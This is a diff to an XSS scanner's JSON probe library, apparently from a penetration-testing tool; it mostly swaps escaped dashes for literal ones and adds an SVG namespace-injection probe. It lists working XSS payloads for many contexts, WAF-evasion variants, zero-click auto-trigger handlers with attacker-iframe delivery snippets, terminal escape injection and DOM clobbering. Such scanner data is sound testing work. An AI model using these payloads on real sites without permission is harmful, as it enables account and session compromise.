@@ -12,7 +12,7 @@
   ],
   "contexts": {
     "html": {
-      "description": "Reflected XSS probes for HTML body context \u2014 tests raw tag injection and script execution",
+      "description": "Reflected XSS probes for HTML body context — tests raw tag injection and script execution",
       "tech_match": [],
       "param_match": [
         "search",
@@ -30,7 +30,7 @@
       "probes": [
         {
           "payload": "<swk{{marker}}>",
-          "description": "Unique marker tag injection \u2014 reflection of <swkXXXX> confirms unescaped HTML context (won't match natural tags)",
+          "description": "Unique marker tag injection — reflection of <swkXXXX> confirms unescaped HTML context (won't match natural tags)",
           "matchers": [
             {
               "type": "reflection",
@@ -70,7 +70,7 @@
       ]
     },
     "attribute": {
-      "description": "Reflected XSS probes targeting HTML attribute context \u2014 breaks out of quoted attributes to inject event handlers",
+      "description": "Reflected XSS probes targeting HTML attribute context — breaks out of quoted attributes to inject event handlers",
       "tech_match": [],
       "param_match": [
         "search",
@@ -128,7 +128,7 @@
       ]
     },
     "angular": {
-      "description": "AngularJS template injection probes \u2014 tests server-side or client-side Angular expression evaluation",
+      "description": "AngularJS template injection probes — tests server-side or client-side Angular expression evaluation",
       "tech_match": [
         "AngularJS"
       ],
@@ -148,7 +148,7 @@
       "probes": [
         {
           "payload": "{{7*7}}",
-          "description": "Angular expression evaluation probe \u2014 49 confirms SSTI or client-side template injection",
+          "description": "Angular expression evaluation probe — 49 confirms SSTI or client-side template injection",
           "matchers": [
             {
               "type": "word",
@@ -194,7 +194,7 @@
       ]
     },
     "javascript_context": {
-      "description": "XSS probes for injection inside existing <script> blocks \u2014 breaks out of string literals or script tags to execute attacker-controlled JavaScript",
+      "description": "XSS probes for injection inside existing <script> blocks — breaks out of string literals or script tags to execute attacker-controlled JavaScript",
       "tech_match": [],
       "param_match": [
         "callback",
@@ -207,7 +207,7 @@
       "probes": [
         {
           "payload": "\";alert(1)//",
-          "description": "Double-quote string breakout inside script block \u2014 closes string, injects alert, comments out rest of line",
+          "description": "Double-quote string breakout inside script block — closes string, injects alert, comments out rest of line",
           "matchers": [
             {
               "type": "reflection",
@@ -220,7 +220,7 @@
         },
         {
           "payload": "'-alert(1)-'",
-          "description": "Single-quote string breakout with arithmetic context \u2014 subtraction operator forces alert execution as expression",
+          "description": "Single-quote string breakout with arithmetic context — subtraction operator forces alert execution as expression",
           "matchers": [
             {
               "type": "reflection",
@@ -233,7 +233,7 @@
         },
         {
           "payload": "</script><script>alert(1)</script>",
-          "description": "Script tag breakout \u2014 closes existing script block and opens a new one with attacker-controlled code",
+          "description": "Script tag breakout — closes existing script block and opens a new one with attacker-controlled code",
           "matchers": [
             {
               "type": "reflection",
@@ -246,7 +246,7 @@
         },
         {
           "payload": "${alert(document.domain)}",
-          "description": "Template-literal breakout \u2014 reflection inside a backtick-delimited JS string; ${} is evaluated by the browser even when < > & ' \" and \\ are HTML/Unicode-escaped (the 'template literal with angle brackets escaped' lab). Confirm execution with probe_xss_executed.",
+          "description": "Template-literal breakout — reflection inside a backtick-delimited JS string; ${} is evaluated by the browser even when < > & ' \" and \\ are HTML/Unicode-escaped (the 'template literal with angle brackets escaped' lab). Confirm execution with probe_xss_executed.",
           "matchers": [
             {
               "type": "reflection",
@@ -260,7 +260,7 @@
       ]
     },
     "dom_based": {
-      "description": "DOM XSS probes targeting client-side sinks \u2014 javascript: href injection, img onerror, and Angular constructor chain",
+      "description": "DOM XSS probes targeting client-side sinks — javascript: href injection, img onerror, and Angular constructor chain",
       "tech_match": [],
       "param_match": [
         "search",
@@ -282,7 +282,7 @@
       "probes": [
         {
           "payload": "javascript:alert(1)",
-          "description": "javascript: pseudo-protocol in href/src \u2014 triggers in DOM sinks that set href without sanitisation",
+          "description": "javascript: pseudo-protocol in href/src — triggers in DOM sinks that set href without sanitisation",
           "matchers": [
             {
               "type": "reflection",
@@ -295,7 +295,7 @@
         },
         {
           "payload": "<img src=x onerror=alert(document.domain)>",
-          "description": "img onerror DOM XSS probe using document.domain \u2014 confirms execution context",
+          "description": "img onerror DOM XSS probe using document.domain — confirms execution context",
           "matchers": [
             {
               "type": "reflection",
@@ -308,7 +308,7 @@
         },
         {
           "payload": "{{constructor.constructor('alert(1)')()}}",
-          "description": "AngularJS sandbox escape via constructor chain \u2014 function in response or reflection confirms injection",
+          "description": "AngularJS sandbox escape via constructor chain — function in response or reflection confirms injection",
           "matchers": [
             {
               "type": "word",
@@ -329,7 +329,7 @@
       ]
     },
     "stored_indicator": {
-      "description": "Stored XSS indicator payloads \u2014 unique markers designed to survive persistence and be detected on a different page",
+      "description": "Stored XSS indicator payloads — unique markers designed to survive persistence and be detected on a different page",
       "tech_match": [],
       "param_match": [
         "comment",
@@ -346,7 +346,7 @@
       "probes": [
         {
           "payload": "<b>xss_stored_{{marker}}</b>",
-          "description": "Benign bold tag with unique marker \u2014 look for reflection on a DIFFERENT page to confirm stored XSS",
+          "description": "Benign bold tag with unique marker — look for reflection on a DIFFERENT page to confirm stored XSS",
           "matchers": [
             {
               "type": "reflection",
@@ -359,7 +359,7 @@
         },
         {
           "payload": "\"><img src=x onerror=alert({{marker}})>",
-          "description": "Attribute breakout + stored onerror probe \u2014 marker reflection on another page confirms stored XSS",
+          "description": "Attribute breakout + stored onerror probe — marker reflection on another page confirms stored XSS",
           "matchers": [
             {
               "type": "reflection",
@@ -373,7 +373,7 @@
       ]
     },
     "waf_bypass": {
-      "description": "WAF evasion XSS payloads from PayloadsAllTheThings \u2014 case mixing, string concat, unicode escapes, self-closing tags",
+      "description": "WAF evasion XSS payloads from PayloadsAllTheThings — case mixing, string concat, unicode escapes, self-closing tags",
       "tech_match": [],
       "param_match": [
         "search",
@@ -391,7 +391,7 @@
       "probes": [
         {
           "payload": "<svg/onload=alert(1)//",
-          "description": "SVG onload with trailing double-slash comment \u2014 bypasses filters that require closing > bracket",
+          "description": "SVG onload with trailing double-slash comment — bypasses filters that require closing > bracket",
           "matchers": [
             {
               "type": "reflection",
@@ -404,7 +404,7 @@
         },
         {
           "payload": "<details open ontoggle=alert(1)>",
-          "description": "HTML5 details element ontoggle \u2014 auto-fires on page load without user interaction",
+          "description": "HTML5 details element ontoggle — auto-fires on page load without user interaction",
           "matchers": [
             {
               "type": "reflection",
@@ -417,7 +417,7 @@
         },
         {
           "payload": "<img src=x onerror=window['al'+'ert'](1)>",
-          "description": "String concatenation WAF bypass \u2014 splits alert keyword to evade static keyword filters",
+          "description": "String concatenation WAF bypass — splits alert keyword to evade static keyword filters",
           "matchers": [
             {
               "type": "reflection",
@@ -430,7 +430,7 @@
         },
         {
           "payload": "<img src=x onerror=\\u0061lert(1)>",
-          "description": "Unicode escape WAF bypass \u2014 \\u0061 = 'a', bypasses filters matching literal 'alert'",
+          "description": "Unicode escape WAF bypass — \\u0061 = 'a', bypasses filters matching literal 'alert'",
           "matchers": [
             {
               "type": "reflection",
@@ -443,7 +443,7 @@
         },
         {
           "payload": "<ScRiPt>{{marker}}</ScRiPt>",
-          "description": "Mixed case script tag \u2014 bypasses case-sensitive keyword blacklists",
+          "description": "Mixed case script tag — bypasses case-sensitive keyword blacklists",
           "matchers": [
             {
               "type": "reflection",
@@ -456,7 +456,7 @@
         },
         {
           "payload": "<svg><script>alert&#40;1&#41;</script>",
-          "description": "HTML entity encoding inside SVG script \u2014 bypasses filters checking for raw parentheses",
+          "description": "HTML entity encoding inside SVG script — bypasses filters checking for raw parentheses",
           "matchers": [
             {
               "type": "reflection",
@@ -469,7 +469,7 @@
         },
         {
           "payload": "<body onload=alert(1)>",
-          "description": "Body onload injection \u2014 effective when input is injected near the top of the page body",
+          "description": "Body onload injection — effective when input is injected near the top of the page body",
           "matchers": [
             {
               "type": "reflection",
@@ -482,7 +482,7 @@
         },
         {
           "payload": "<button popovertarget=x onbeforetoggle=alert(1)>x</button><div id=x popover>",
-          "description": "Popover API onbeforetoggle handler \u2014 fires without click; bypasses filters blocking on*=/onclick",
+          "description": "Popover API onbeforetoggle handler — fires without click; bypasses filters blocking on*=/onclick",
           "matchers": [
             {
               "type": "reflection",
@@ -495,7 +495,7 @@
         },
         {
           "payload": "<form onformdata=alert(1)><input><button>x",
-          "description": "onformdata event handler \u2014 newer sink often missing from WAF allowlists",
+          "description": "onformdata event handler — newer sink often missing from WAF allowlists",
           "matchers": [
             {
               "type": "reflection",
@@ -508,7 +508,7 @@
         },
         {
           "payload": "<img src onerror=window['al'+'ert'](1)>",
-          "description": "String-split keyword evasion via bracket-property access \u2014 defeats 'alert(' signature",
+          "description": "String-split keyword evasion via bracket-property access — defeats 'alert(' signature",
           "matchers": [
             {
               "type": "reflection",
@@ -521,7 +521,7 @@
         },
         {
           "payload": "<img src=x onerror=alert&#0000000040;document.domain&#0000000041;>",
-          "description": "HTML decimal-entity with leading zeros for ( ) \u2014 bypasses filters matching literal parentheses",
+          "description": "HTML decimal-entity with leading zeros for ( ) — bypasses filters matching literal parentheses",
           "matchers": [
             {
               "type": "reflection",
@@ -728,7 +728,7 @@
       ]
     },
     "chatbot_dom_sink_2025": {
-      "description": "Chatbot / chat UI DOM XSS \u2014 input fields with placeholder *chat* / data-testid *chat* render via innerHTML / jQuery.html. 2025 AWVS context.",
+      "description": "Chatbot / chat UI DOM XSS — input fields with placeholder *chat* / data-testid *chat* render via innerHTML / jQuery.html. 2025 AWVS context.",
       "tech_match": [],
       "param_match": [
         "message",
@@ -738,7 +738,7 @@
       "probes": [
         {
           "payload": "<img src=x onerror=alert(1)>",
-          "description": "Submit <img onerror> to chat input \u2014 reflected via DOM sink (innerHTML/insertAdjacentHTML/jQuery.html)",
+          "description": "Submit <img onerror> to chat input — reflected via DOM sink (innerHTML/insertAdjacentHTML/jQuery.html)",
           "matchers": [
             {
               "type": "reflection",
@@ -760,7 +760,7 @@
       ]
     },
     "auto_trigger_delivery": {
-      "description": "No-victim-interaction XSS delivery \u2014 event handlers that fire without a click. Some self-trigger on render (onanimationstart / onpageshow / SVG onbegin, no attacker page); others fire when an attacker page frames the target and manipulates the iframe (onhashchange / onresize / onscroll). The mechanism is delivery, not just the payload \u2014 each probe carries the attacker-page trigger snippet. See playbook-xss-delivery.md for the full decision table.",
+      "description": "No-victim-interaction XSS delivery — event handlers that fire without a click. Some self-trigger on render (onanimationstart / onpageshow / SVG onbegin, no attacker page); others fire when an attacker page frames the target and manipulates the iframe (onhashchange / onresize / onscroll). The mechanism is delivery, not just the payload — each probe carries the attacker-page trigger snippet. See playbook-xss-delivery.md for the full decision table.",
       "tech_match": [],
       "param_match": [
         "search",
@@ -778,7 +778,7 @@
       "probes": [
         {
           "payload": "<body onhashchange=alert(document.domain)>",
-          "description": "onhashchange auto-trigger via attacker iframe \u2014 inject the handler, then from an attacker page frame the target and append a fragment to fire it with zero victim interaction. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onhashchange=alert(document.domain)>\" onload=\"this.src+='#x'\"></iframe>",
+          "description": "onhashchange auto-trigger via attacker iframe — inject the handler, then from an attacker page frame the target and append a fragment to fire it with zero victim interaction. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onhashchange=alert(document.domain)>\" onload=\"this.src+='#x'\"></iframe>",
           "matchers": [
             {
               "type": "reflection",
@@ -793,7 +793,7 @@
         },
         {
           "payload": "<body onresize=alert(document.domain)>",
-          "description": "onresize auto-trigger via attacker iframe \u2014 resizing the frame fires the handler, no victim interaction. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onresize=alert(document.domain)>\" onload=\"setTimeout(()=>this.style.width='100px',1000)\"></iframe>",
+          "description": "onresize auto-trigger via attacker iframe — resizing the frame fires the handler, no victim interaction. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onresize=alert(document.domain)>\" onload=\"setTimeout(()=>this.style.width='100px',1000)\"></iframe>",
           "matchers": [
             {
               "type": "reflection",
@@ -808,7 +808,7 @@
         },
         {
           "payload": "<body onscroll=alert(document.domain)><div style=height:3000px></div>",
-          "description": "onscroll auto-trigger via attacker iframe \u2014 scrolling the framed target fires the handler. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onscroll=alert(document.domain)><div style=height:3000px></div>\" onload=\"this.contentWindow.scrollTo(0,1000)\"></iframe>. Fallback when cross-origin scrollTo is blocked by SOP: append #id to the src and give the injected element that id so the browser auto-scrolls it into view.",
+          "description": "onscroll auto-trigger via attacker iframe — scrolling the framed target fires the handler. Trigger: <iframe src=\"https://TARGET/?PARAM=<body onscroll=alert(document.domain)><div style=height:3000px></div>\" onload=\"this.contentWindow.scrollTo(0,1000)\"></iframe>. Fallback when cross-origin scrollTo is blocked by SOP: append #id to the src and give the injected element that id so the browser auto-scrolls it into view.",
           "matchers": [
             {
               "type": "reflection",
@@ -823,7 +823,7 @@
         },
         {
           "payload": "<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><xss style=\"animation-name:x\" onanimationstart=alert(document.domain)></xss>",
-          "description": "onanimationstart auto-trigger \u2014 the CSS @keyframes animation starts on render, firing the handler with ZERO interaction and no attacker page. Self-contained: the <style> block and the animated element are both in the payload.",
+          "description": "onanimationstart auto-trigger — the CSS @keyframes animation starts on render, firing the handler with ZERO interaction and no attacker page. Self-contained: the <style> block and the animated element are both in the payload.",
           "matchers": [
             {
               "type": "reflection",
@@ -836,7 +836,7 @@
         },
         {
           "payload": "<body onpageshow=alert(document.domain)>",
-          "description": "onpageshow auto-trigger \u2014 fires on initial load and on bfcache restore (browser back/forward), ZERO interaction, no attacker page needed.",
+          "description": "onpageshow auto-trigger — fires on initial load and on bfcache restore (browser back/forward), ZERO interaction, no attacker page needed.",
           "matchers": [
             {
               "type": "reflection",
@@ -849,7 +849,7 @@
         },
         {
           "payload": "<svg><animatetransform onbegin=alert(document.domain) attributeName=transform></svg>",
-          "description": "SVG SMIL onbegin auto-trigger \u2014 the animation begins on render, firing onbegin with ZERO interaction. Bypasses filters that blocklist only HTML on* handlers and miss SVG SMIL animation events.",
+          "description": "SVG SMIL onbegin auto-trigger — the animation begins on render, firing onbegin with ZERO interaction. Bypasses filters that blocklist only HTML on* handlers and miss SVG SMIL animation events.",
           "matchers": [
             {
               "type": "reflection",
@@ -875,7 +875,7 @@
       "probes": [
         {
           "payload": "\u001b]0;pwned\u0007",
-          "description": "OSC title-set \u2014 if the terminal renders this, escape sequences are processed from content. Benign detection: changes window title to pwned.",
+          "description": "OSC title-set — if the terminal renders this, escape sequences are processed from content. Benign detection: changes window title to pwned.",
           "matchers": [
             {
               "type": "word",
@@ -890,7 +890,7 @@
         },
         {
           "payload": "\u001b[?1049h",
-          "description": "CSI alternate screen buffer \u2014 if terminal switches to alt buffer, escape processing is active on untrusted content",
+          "description": "CSI alternate screen buffer — if terminal switches to alt buffer, escape processing is active on untrusted content",
           "matchers": [],
           "variables": {
             "reference_only": true
@@ -903,7 +903,7 @@
       "probes": [
         {
           "payload": "<a id=x><a id=x name=y href=//COLLABORATOR>",
-          "description": "DOM clobbering probe \u2014 two anchors with same id create an HTMLCollection. document.x.y resolves to the href. If reflected in a page that reads document.x.y as a URL, it triggers navigation to COLLABORATOR.",
+          "description": "DOM clobbering probe — two anchors with same id create an HTMLCollection. document.x.y resolves to the href. If reflected in a page that reads document.x.y as a URL, it triggers navigation to COLLABORATOR.",
           "matchers": [
             {
               "type": "word",
@@ -914,6 +914,35 @@
           ],
           "variables": {
             "reference_only": true
+          }
+        }
+      ]
+    },
+    "svg_namespace_injection": {
+      "description": "SVG sanitizers that validate the DOM tree before serialization miss namespace-URI injection. Libraries like xml-rs and lxml escape ordinary attribute values but leave xmlns declaration URIs unescaped. Injecting markup into a namespace value breaks out of the attribute and injects arbitrary SVG/HTML after the sanitizer has approved the document.",
+      "tech_match": [
+        "SVG",
+        "ImageMagick",
+        "image proxy",
+        "CDN"
+      ],
+      "probes": [
+        {
+          "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>safe</text></svg>",
+          "description": "Baseline SVG upload — check if the endpoint accepts and re-serves SVG content. If it does, the namespace injection path is viable on any sanitize-then-reserialize pipeline.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "<svg",
+                "xmlns"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {
+            "class": "sanitizer_bypass"
           }
         }
       ]
